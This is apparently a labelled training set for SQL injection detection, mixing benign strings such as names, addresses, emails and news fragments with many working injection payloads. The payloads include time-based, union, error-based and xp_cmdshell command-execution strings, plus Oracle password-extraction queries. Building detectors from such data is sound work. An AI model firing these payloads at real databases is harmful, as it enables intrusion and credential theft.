Sentence,Label
"1%""  )  )   )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( ""%"" = """,1
0278006961359320,0
"1 )  as nkjo where 8462 = 8462 union all select null,null,null,null,null,null,null,null,null--",1
" Should mother alarmed daughter begins sprout breast buds pubic hair 7 8 ? At annual conference American Academy Pediatrics week Orlando , Florida , pediatric endocrinologist Dr",0
belalczar,0
3910,0
1%' and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and '%' = ',1
arrigorriaga,0
7n0ali-2ar,0
"1%' and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
3st59et982,0
gareth,0
"escuelas 148,",0
ryszard,0
 House fire Helmbrechts: Rescue services retrieve charred body The fire service called Helmbrechts late Thursday evening ,0
7580,0
"-3672""  )  )   union all select 6093#",1
48031,0
philip7,0
14399392n,0
despernada,0
vikram,0
"1' )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and  ( 'urxs' = 'urxs",1
"calle tortajada s/n, 6?a",0
doneva@easyviaggio.com.je,0
dieciseisavo,0
yadhira,0
1 where 7890 = 7890 or sleep ( 5 ) --,1
calle bernat de santa eugenia 90,0
50708405y,0
-2374 )  or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( 2576 = 2576,1
boar,0
"1' and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and 'wjwn' = 'wjwn",1
"poblado de regulares 180, 1d",0
-7426' order by 1#,1
34310,0
1 )  where 9167 = 9167,1
6908395975475086,0
saiah.bauer@intapisur.mc,0
1%' and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and '%' = ',1
1' where 2661 = 2661,1
ulric,0
sorzano,0
irre2u3er6b22,0
willie51,0
"1' )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( 'amjh' = 'amjh",1
-6865 )  or  ( 8459 = 8459 ) *4906 and  ( 6107 = 6107,1
azarshah,0
xifr,0
57i-9557a,0
53087910t,0
masvidal canino,0
"-9505'  )  )   )  or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( 'qhdg' = 'qhdg",1
fowler,0
rascadura,0
kirbee,0
"1"" or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and ""zcfa"" = ""zcfa",1
agra leuco,0
"1' and elt ( 1210 = 1210,sleep ( 5  )  )   and 'pjrf' = 'pjrf",1
" &quot; Year-to-date , 10 countries profitable several track record full-year earnings interest tax contributions , &quot; said ",0
"calle muelles 57, 10?d",0
"1""  )  )   as qqhm where 7182 = 7182",1
96269598q,0
"1'|| ( select 'uvbb' where 7795 = 7795 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null  )  )  ||'",1
 They achieved promising results English Chinese transcribed speech texts,0
"1%"" )  rlike sleep ( 5 )  and  ( ""%"" = """,1
67,0
9431159156347522,0
"-4947' in boolean mode )  union all select 3314,3314#",1
"1'  )  )   as popm where 6594 = 6594 union all select null,null#",1
; exec master..xp_cmdshell,1
"1 )  where 8474 = 8474 or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
hy,0
gianella,0
"1'  )  )   or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (  'pqxe' like 'pqxe",1
t'exec master..xp_cmdshell 'nslookup www.googl ...,1
ermelindo,0
kapp,0
" While people past centuries overly conscious , focusing pictures heaven hell &quot; defined ideas &quot; , contemporary prophetic teaching hope consummation characterised certain bashfulness , even speechlessness ",0
62258107m,0
"1'  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) ",1
"1""  )  )   as nwnp where 6140 = 6140",1
"-9313%"" )  or 5971 = 4572#",1
" select * from users where id = 1 or @#"". = 1 or 1 = 1 -- 1",1
dulcera,0
minardi cardea,0
3409473973742176,0
baldomera,0
"1' )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( 'ndhn' like 'ndhn",1
8762163912955925,0
" Men called good action, piece courage charity, much would pay fine expiation daily non-appearance parade",0
 One visitor wants know CCAA means ,0
"1 )  or elt ( 5873 = 5873,sleep ( 5  )  )  #",1
22470,0
33734,0
"1, ( select  ( case when  ( 5433 = 5433 )  then 1 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual ) ",1
1  )  )   waitfor delay '0:0:5'--,1
"1' )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  ",1
milad,0
que3h5a,0
"-2046' )  union all select 6668,6668--",1
"1 or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) # cqqs",1
0x730065006c0065006300740020004000400076006500 ...,1
bearse@cdgranadabaila.lv,0
1 )  as boed where 6787 = 6787,1
rudolf,0
ramaprak,0
" So far , candidate succeed Mayor Norbert Brugger , longer running account age , 46-year-old banker business economist Dieter Köpfler Löffingen ",0
42583172y,0
19371,0
1 )  where 7026 = 7026,1
"1""  )  )   and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (  ""qycx"" like ""qycx",1
" select * from users where id = 1 or "",;"" or 1 = 1 -- 1",1
"1' in boolean mode )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) #",1
28011073v,0
 select * from users where id = 1 %!<1 or 1 = 1 -- 1,1
-6100' )  as kvfc where 2377 = 2377 or 6872 = 6872--,1
 The organisation &apos;s desert vehicle also shown ,0
graupere trabucco,0
"1 )  or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and  ( 3294 = 3294",1
56926815k,0
9780,0
" Compared graph-based parsing, transition-based parsing offer linear time complexity easily leverage non-local features models (Yamada Matsumoto, 2003; Nivre et al",0
81881966b,0
"1'+ ( select jrmz where 4762 = 4762 and elt ( 9588 = 9794,9794  )  )  +'",1
"select count ( * )  from generate_series ( 1,5000000 ) --",1
"-1606'|| ( select 'qbaa' where 3967 = 3967 union all select 3967,3967,3967,3967,3967--",1
amalie,0
"-2518' union all select 6818,6818,6818,6818,6818,6818#",1
" Mother buried shallow forest grave pension stolen When elderly mother died , man Wolfsburg devised plan ",0
valdelosa,0
1'  )  )   )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (   ( 'vtoi' like 'vtoi,1
17485,0
49625,0
'; begin declare @var varchar ( 8000 )  set @var = ':' select @var = @var+'+login+'/'+password+' ' from users where login > ,1
kernke-langevin@estoeslahostia.kr,0
//,1
"juan de salcedo, 158 5?f",0
"1""  )  )   )  and 5429 = 9596",1
1' )  where 2928 = 2928 and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1
zelma,0
"carretera barajas, 147,",0
lubin,0
"calle crehuet, 63 4-h",0
31087137s,0
85009456f,0
' or a = a--,1
1 and 1 = 1,1
54011879j,0
ret4ne3or,0
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  (   ( 'pshn' like 'pshn",1
"paseo alameda de osuna 10,",0
9182,0
"-8640 )  or elt ( 7657 = 5020,5020 )  and  ( 2346 = 2346",1
"plaza conde de carlet, 40",0
""";waitfor delay '0:0:__TIME__'--",1
rizoide,0
"estrecho de ormuz 62, 7-g",0
88684338h,0
floriano,0
4300788041091326,0
"1"" )  as buky where 7898 = 7898 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
5055,0
-1468'  )  )   )  or 4875 = 6163#,1
f5o9a8en9e,0
4102716313272060,0
 Rescue workers took girl hospital ,0
1' waitfor delay '0:0:5' and 'vwuz' = 'vwuz,1
"1"" and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and ""tjbe"" like ""tjbe",1
"c/ canigo, 196 8?g",0
1  )  )   as xlww where 5844 = 5844,1
09614,0
 select sleep ( 5 )  and   (  (   ( 5552 = 5552,1
 The company fund using 60 per cent S $ 66m raised week listing Singapore stock exchange ,0
nickonov,0
33120,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
"1%""  )  )   and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"calle virgen de la estrella, 196",0
" While boasting comfort , builders also offer jets high-density layouts low-cost airlines regional travel ",0
49645694x,0
tilbrook@saludyfitness.pr,0
-5137 )  or 9323 = 9323#,1
ta1anta,0
vinaixa calleiros,0
1 )  where 9344 = 9344,1
93830161m,0
sedran,0
enconadura,0
corella,0
1' )  as uwmy where 6980 = 6980,1
leroi,0
"1"" or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and ""ctdc"" = ""ctdc",1
7825,0
pujal vilalta,0
desmerecer,0
9327671462034435,0
"1' in boolean mode )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  #",1
francisc,0
1 )  as nsdy where 7513 = 7513,1
 The Department Education due release new syllabuses English maths tomorrow - first subjects undergo radical overhaul ,0
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT banner FROM v$version WHERE ROWNUM = 1  )  )   AND 'i' = 'i,1
hermanos barral 61,0
cercs,0
1'|| ( select 'aojt' from dual where 8499 = 8499,1
1934,0
 Everything IT industry ,0
truncate,1
" select * from users where id = 1 <@$$ union select 1,version (  )  -- 1",1
"1"" )  where 2278 = 2278",1
savino,0
cgi 1081743475 1085 109-1,0
"5 billion , deal driven partly Motorola &apos;s library patents ",0
28614822q,0
"1"" )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and  ( ""cdnc"" like ""cdnc",1
pataki-grifties@hiteurope.by,0
ku,0
eggebraa,0
rec,0
demstenes,0
cgi maket 238 %BB%E7%C0%E5%B4%DC -----------------------------7e116d19044c 2 [url = http://ciassssssional,0
84881293t,0
"-9535"" order by 1--",1
bentos campins,0
select  ( case when  ( 9030 = 9185 )  then 9030 else 9030* ( select 9030 from information_schema.character_sets )  end ) #,1
1' in boolean mode )  and 9198 = 9198--,1
77974019v,0
puebla de la sierra,0
-4892%'  )  )   or 2251 = 9881--,1
"1' and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and 'cxor' = 'cxor",1
henry,0
 The best moments evening singing starts - tracks range Deep Purple traditional folk songs ,0
6070377795549230,0
aguazo,0
 The Aachen resident suffered serious injuries taken hospital treatment ,0
usma launes,0
", 2005; Matusov et al",0
"1'  )  )   as yyja where 4321 = 4321 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
saia,0
letemendia dou,0
haddon@hiperbarcelona.tl,0
1  )  )   )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( 4694 = 4694,1
lebrillo,0
42112,0
4735417998508375,0
1' )  where 3588 = 3588,1
select  ( case when  ( 1272 = 5883 )  then 1272 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
1' )  where 1183 = 1183,1
waring,0
 &quot; Relations US Germany come strain following claims NSA bugged Chancellor Angela &apos;s Merkel &apos;s phone ,0
"travesia castilla, 92, 5-g",0
" Rather , euro system locked members exchange rates favourable German exporters - something German politicians want keep ",0
"mirn, el",0
 Registration open hours prior beginning competition ,0
miles,0
aleandra,0
"1'  )  )   )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( 'wzdo' = 'wzdo",1
jande,0
nesime,0
"1""  )  )   or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
-1479%' or 5201 = 3398--,1
piel,0
scheppan-ishikawa@tuslimites.ly,0
garam2nte,0
" He would gather immortal palms must hindered name goodness, must explore goodness",0
" select * from users where id = 1 or "" ( _"" or 1 = 1 -- 1",1
reginald,0
zuzana,0
24806506v,0
asan8,0
zylstra,0
renata,0
"1"" where 7045 = 7045",1
luhmaan,0
1' order by 1--,1
1%' and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,1
-8131'  )  )   or 9680 = 3467,1
6273470389160924,0
bertilia,0
sant pere de ribes,0
1'+ ( select 'lpkv' where 8760 = 8760,1
-3666' )  where 6386 = 6386 union all select 6386--,1
"-5830 )  or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) ",1
santo domingo de las posadas,0
a' waitfor delay '0:0:10'--,1
3900278592647415,0
1  )  )   as wwkw where 7289 = 7289 and 7533 = 7533--,1
15994230f,0
"-1339  )  )   )  union all select 6318,6318,6318,6318,6318,6318,6318,6318,6318#",1
"1 )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and  ( 5130 = 5130",1
berkhart@joyclub.mh,0
4538,0
1'  )  )   and 4242 = 5831 and   (  (  'xflh' like 'xflh,1
"1""  )  )   and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and   (  (  ""qqky"" like ""qqky",1
 Specialist Technical Rescue Officer Peter Lau said: &quot; Ruby lucky escape ,0
"1%' or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and '%' = '",1
" Bombardier profit dips plane deliveries , orders fall Canadian plane train maker Bombardier Inc reported 15 percent fall net profit Thursday , pressured fewer aircraft orders deliveries third quarter contract issues train unit ",0
9903rti37,0
"1"" )  as ypfa where 6128 = 6128",1
' or username like '%,1
" Dick considered American prophet , certainly highly esteemed within native country ",0
" Not nothing one face, one character, one fact, makes much impression him, another none",0
98993276b,0
"1 )  where 5048 = 5048 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
"-4605"" )  union all select 8542,8542,8542,8542,8542,8542,8542,8542--",1
"1' )  union all select null,null,null,null#",1
pasadizo fernandez 92 3-c,0
"1  )  )   )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 8738 = 8738",1
28413,0
muntaner nevado,0
0854278659322549,0
"1%' or elt ( 6272 = 6272,sleep ( 5  )  )   and '%' = '",1
jan,0
1381,0
genestar llufriu,0
navacerrada cosp,0
clovis,0
mandruso,0
lamm lodeiro,0
irado,0
87053274e,0
"1"" )  and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( ""cmhh"" like ""cmhh",1
"plaa mig de can clos, 122",0
" The jury heard Thursday Coulson confronted Mr Blunkett affair married woman seeing co-defendant Rebekah Brooks , married time ",0
26295439e,0
-9644  )  )   or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (  5616 = 5616,1
9904632053725609,0
"1' )  as saqp where 6612 = 6612 union all select null,null,null,null,null,null,null--",1
75u1al3e,0
08149938a,0
02247,0
"paseo rey, 167 8-f",0
gervasio,0
" With &quot; Euclid &quot; , ESA already approved M-mission , planned commence 2020 ",0
" &quot; No , &quot; Mr Tripodi replied ",0
muntadas,0
1pa5364e3a,0
ditte pallars,0
a5aranjada,0
1  )  )   as sipp where 1999 = 1999 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) --,1
cavia,0
"1"" )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( ""fbqy"" like ""fbqy",1
1'+ ( select 'vjoj' where 5348 = 5348,1
1' and 5835 = 6157 and 'bjee' like 'bjee,1
"-8655 )  where 3910 = 3910 union all select 3910,3910#",1
laruffa,0
vacher,0
"1%'  )  )   and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
2389465046148028,0
boys@muebetuweb.mu,0
 The crisis euro little national governments running excessive budget deficits - true Greece ,0
0131573485313160,0
biener@926.bo,0
yahed,0
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and '%' = '",1
belver,0
groen@civicosdns.na,0
49716,0
1%' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and '%' = ',1
lonidas,0
"-7737'|| ( select 'xalo' where 9219 = 9219 union all select 9219,9219,9219,9219#",1
"1%'  )  )   or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
